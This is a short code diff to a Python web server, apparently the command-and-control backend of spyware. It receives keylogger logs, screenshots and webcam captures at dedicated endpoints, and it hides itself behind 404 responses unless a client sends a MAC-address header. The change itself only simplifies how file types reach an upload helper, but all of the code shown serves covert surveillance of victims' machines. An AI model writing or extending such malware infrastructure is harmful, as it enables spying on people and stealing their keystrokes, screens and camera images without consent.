@@ -80,7 +80,7 @@ async def keylog(request: Request) -> Union[None, HTTPException]:
     if HTTPHeaders.MAC not in request.headers:
         return HTTPException(status_code=status.HTTP_404_NOT_FOUND)
     update_datetime(request)
-    await upload_file(request, 'log', DBIdentifiers.KEYLOG, 'txt', True)
+    await upload_file(request, 'log', DBIdentifiers.KEYLOG, True)
 
 
 @app.post('/screenshot')
@@ -88,9 +88,7 @@ async def screenshot(request: Request) -> Union[None, HTTPException]:
     if HTTPHeaders.MAC not in request.headers:
         return HTTPException(status_code=status.HTTP_404_NOT_FOUND)
     update_datetime(request)
-    # retrieve image file type
-    file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
-    await upload_file(request, 'screenshot', DBIdentifiers.SCREENSHOT, file_type)
+    await upload_file(request, 'screenshot', DBIdentifiers.SCREENSHOT)
 
 
 @app.post('/webcam_capture')
@@ -98,9 +96,7 @@ async def webcam_capture(request: Request) -> Union[None, HTTPException]:
     if HTTPHeaders.MAC not in request.headers:
         return HTTPException(status_code=status.HTTP_404_NOT_FOUND)
     update_datetime(request)
-    # retrieve image file type
-    file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
-    await upload_file(request, 'webcam', DBIdentifiers.WEBCAM, file_type)
+    await upload_file(request, 'webcam', DBIdentifiers.WEBCAM)
 
 
 if __name__ == '__main__':
